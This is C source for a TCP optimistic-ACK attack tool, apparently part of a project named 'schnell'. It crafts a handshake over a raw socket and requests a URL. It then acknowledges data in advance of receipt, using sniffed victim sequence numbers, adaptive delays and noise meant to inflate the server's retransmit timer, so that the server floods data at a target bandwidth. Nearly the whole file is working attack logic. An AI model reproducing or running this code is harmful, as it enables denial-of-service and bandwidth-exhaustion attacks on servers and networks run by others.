#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/types.h>
#include <pcap.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <signal.h>




#include "schnell.h"
#include "packetqueue.h"

void handleAlarm(int);
void * packetGrabber6(void *);


int do_schnell6_attack(rawSock){
	int retries=0;
	int slowstart=1;
	// nSegments = our congestion window, but kept in segments, not bytes
	int nSegments=2;	//RFC2414
	int i;
	int ssthresh=65535;
	long usProcessingTime=0;
	long delay;
	//struct sched_param sched_thing;	// for RT priority
	pthread_t grabber;
	struct timeval then, now;
	unsigned int thenAck, nowAck;
	double tmp;
	double maxSegments;			// maximum # of segments to send/ms
	long usFastDelay, usSlowDelay,usCurrentDelay;
	unsigned int lastACK;
	long usSendDelay;		// time to send one ACK




	// do three way handshake
        do {
                sendSYN(rawSock);
                retries++;
        } while( getSYNACK(rawSock) && (retries < 10));
	if(retries>=10){
		fprintf(stderr,"Never Got SYNACK :(\n");
		exit(1);
	}

        victimSequence++;
        localSequence++;
        sendACK(rawSock);
	// send request
        sendHTMLGET(rawSock);   // send "GET URL\r\n" to server
	// setup stuff
	// FIXME might want to grab the ACK
	lastACK=victimSequence;
	thenAck=lastACK;
	gettimeofday(&then,NULL);
	Window = 65533;	// set the recv window all of the way open
			// encode the state in the window, for debug
	// loop until connection close
	printf("Attack5: RTT=%lu us, nSegments=%d, Target Bandwidth=%lu\n"
			,usRTT,nSegments,TargetBandwidth);
	/* THis locks the machine!!
	printf("Setting Scheduler to SCHED_RR for better nanosleep() accuracy\n");
	sched_thing.sched_priority=1;
	if(sched_setscheduler(0,SCHED_RR,&sched_thing)){
		perror("ERR: sched_setscheduler");
		abort();
	}
	if(setpriority(PRIO_PGRP,0,-20)){
		perror("ERR: setpriority");
		exit(1);
	}
	*/
	nice(-19);	

	usSendDelay = 1000000*(double)54/LocalBandwidth;	// how many microsecs between ACKs
			// ACK = 20 tcp bytes, 20 ip bytes, and 14 for ethernet frame

	// spawn tracker thread
	pthread_create(&grabber,NULL,packetGrabber6,&rawSock);
	maxSegments = (double) LocalBandwidth/(40*1000*1000);	// max segments/microsecond
	printf("LocalBandwidth %ld == %f segments/us\n",LocalBandwidth,maxSegments);
	if(AdaptiveDelay){
		// microseconds to send a window
		tmp = (double)WindowMax/MSS;	// maxPackets in a Window
		usFastDelay =1000000*tmp*(MSS+40+14)/((double)TargetBandwidth);	// (bytes sent/window)/rate
		usFastDelay *=Efficency;	// % of window we ACK per round
		// the 1.05 is so we get ~95% efficency
		//usFastDelay = 1.05 * (double) usFastDelay;
		usSlowDelay = 10*usFastDelay;
		usCurrentDelay = usSlowDelay+DelayIncrement;
		printf("Using adaptive delay fast = %ld slow = %ld inc= %ldus\n",
				usFastDelay, usSlowDelay,DelayIncrement);
	}
	// and loop
	gotFINorRST=0;
	SignalRestart=0;
	while(!gotFINorRST){
		heartbeat("top of loop");
		if(SignalRestart==1){
			slowstart=1;  // we are not sure what the cwnd size is, so ss again just in case!!
			lastACK=victimSequence;
			ACK(rawSock,lastACK);	// ack the packet
			nSegments=2;	// since we just ACK'd 1
			SignalRestart=0;
			ssthresh=ssthresh/2;
			printf("--------------- GOT AHEAD of SERVER FULL RESTART;"
					" restarting ssthresh=%d ------\n" ,ssthresh);
			if(AdaptiveDelay)
				usCurrentDelay=usSlowDelay;
		}
		if(SignalRestart==2){	// fast restransmit equiv, so fast restart
			lastACK=victimSequence;
			ACK(rawSock,lastACK);	// ack the packet
			SignalRestart=0;
			nSegments/=2;
			ssthresh/=2;
			printf("--------------- GOT AHEAD of SERVER fast RESTART;"
					" restarting ssthresh=%d ------\n" ,ssthresh);
			if(AdaptiveDelay)
				usCurrentDelay*=2;
		}
		// processing time = (bytes/querry)/(bytes/sec)= s/q
		heartbeat("delay calc");
		usProcessingTime=(unsigned long) 
			((double)1000*nSegments*(14+40+MSS))/((double)TargetBandwidth/1000);
		if(AdaptiveDelay){
			usCurrentDelay=MAX(usCurrentDelay-DelayIncrement,usFastDelay);
			delay = usCurrentDelay;
		} else { 
			if(slowstart){	// was !slowstart -- weird
				usProcessingTime*=2;	// the incoming window was 2times last one
			}
			delay=usRTT;
		}
		// We do this to artificially inflate the RTO timer
		if(drand48()>0.5)
			delay += (double)delay*MaxNoise;
		else
			delay -=(double)delay*MaxNoise;
		delay = MAX(delay,usProcessingTime);	// don't dip below processing time
		delay-=usSendDelay;		// take into account time spent waiting for sending to finish
		if(Verbose)
			printf("delay time %lu; processing time %lu : %d segs, %d MSS \n",
				delay, usProcessingTime,nSegments, MSS);
		heartbeat("before delay");
		if(delay>0)
			myusSleep(delay);
		heartbeat("after delay");
		gettimeofday(&now,NULL);
		nowAck=victimSequence;
		tmp = 1000000*(now.tv_sec-then.tv_sec)+now.tv_usec-then.tv_usec;
		tmp/=1000;	// to ms, not us
		if((tmp!=0)&&Verbose)
			printf("Bandwidth: %f	Bytes/ms %u %f %u %u\n",((double)nowAck-thenAck)/tmp,
					nowAck-thenAck,tmp, nowAck, thenAck);
		thenAck=nowAck;
		then=now;
		heartbeat("before ACKS");
		if(slowstart==1){	
			Window=65533;	// mark state for tcpdump
			for(i=0;i<nSegments;i++){
				lastACK+=MSS;
				ACK(rawSock,lastACK);
				myusSleep(usSendDelay);
			}
			nSegments*=2;
			if((nSegments*MSS)>ssthresh){
				// basically, do the right thing, but
				// don't go over Efficency percent of the window size
				//slowstart=2;
				slowstart=2;	// no transition phase
				nSegments=(ssthresh*Efficency)/MSS;
				Window=65534;
			}
		} else if((slowstart == 2)||(slowstart==3)){	// transition from ss to cc
			Window=65534;
			for(i=0;i<nSegments;i++){
				lastACK+=MSS;
				ACK(rawSock,lastACK);
				myusSleep(usSendDelay);
			}
			if(slowstart==2)
				slowstart=3;
			else
				slowstart=0;
		} else {	// congestion control
			Window=65535;
			assert(slowstart == 0);
			heartbeat("congestion control");
			ACK(rawSock,lastACK+MSS);	// CYA ACK
			myusSleep(usSendDelay);		// delay sending time
			lastACK+=nSegments*MSS;
			ACK(rawSock,lastACK);		// ACK top of current window
			myusSleep(usSendDelay);		// delay sending time
			ssthresh=MIN(WindowMax,ssthresh+2*MSS*MSS/ssthresh);
			heartbeat("after ACK");
			// basically, do the right thing, but
			// don't go over Efficency percent of the max window size
			nSegments=(ssthresh*Efficency)/MSS;
		}
		heartbeat("end of while loop");
	}	// while(!fin or rst)
	ACK(rawSock,victimSequence);	// ACK the fin
	pthread_cancel(grabber);
	return 0;
}	// function
/* void * packetGrabber(void *);
 *
 * 	send restart signals via global variable 
 * 	everytime we timeout on getting *something*
 *
 */

void * packetGrabber6(void *arg){
        struct tcphdr *tcph;
        const unsigned char * packet;
        struct pcap_pkthdr pcap_hdr;
        unsigned int lastseq=victimSequence-1;
        struct timeval now,then;
	long avgdelta=500000;	// start it at 500ms
	long delta;
	double alpha = 0.1;	// just like classic tcp- yay
	double beta = 5;
        int rawSock;
	struct itimerval timer;

        rawSock=*(int*)arg;
	signal(SIGALRM,handleAlarm);
	gettimeofday(&then,NULL);
        while(1){
                packet = pcap_next(PcapHandle,&pcap_hdr);
                if(packet == NULL){
                        fprintf(stderr,"pcap_next: err\n");
                                continue;
                }
                tcph = (struct tcphdr*) (packet + 34);  // 14 + 20 = ethernet + ip hdrs
                if(tcph->fin||tcph->rst)
                        gotFINorRST=1;
                if(pcap_hdr.len<=(14+20+20))    // ignore packets w/no data
                        continue;
                //pq_enqueue(q,ntohl(tcph->seq),pcap_hdr.ts);
                // use this as what we should ACK, i.e. the number they
                // send us + packet length +1 - the header stuff
                victimSequence=ntohl(tcph->seq)+pcap_hdr.len-14-20-20;   
		// if the last segment we got was greater than current segment (by 1 window)
		// or if we got 2 duplicate segments
		// then we got a retransmit, signal a restart
                if(((lastseq-WindowMax)>victimSequence)||(lastseq==victimSequence))  
                        SignalRestart=1;
                gettimeofday(&now,NULL);
		// reset retransmit timer
		delta = 1000000*(now.tv_sec-then.tv_sec)+now.tv_usec-then.tv_usec;
		avgdelta = (1-alpha)*(double)avgdelta+alpha*(double)delta;	// moving avg
		if(Verbose)
			printf("DELTA %ld avg %ld\n",delta,avgdelta);
		timer.it_interval.tv_sec=timer.it_value.tv_sec = (beta*avgdelta)/1000000;
		timer.it_interval.tv_usec=timer.it_value.tv_usec = beta*avgdelta -timer.it_value.tv_sec;
		//setitimer(ITIMER_REAL,&timer,NULL);  // just don't do this for now
		then=now;	//!! don't forget this!!

		// print debug info
                now.tv_sec=now.tv_sec-StartTime.tv_sec;
                now.tv_usec=now.tv_usec-StartTime.tv_usec;
                if(now.tv_usec<0){
                        now.tv_sec--;
                        now.tv_usec+=1000000;
                }
                if(Verbose)
                        printf("DATA: %ld.%.6ld %u\n",now.tv_sec,now.tv_usec,victimSequence);
                lastseq=victimSequence;
        }
        return NULL;
}

void handleAlarm(int ignore){
	SignalRestart=2;
	printf("------ handleAlarm called\n");
	signal(SIGALRM,handleAlarm);
	return;
}

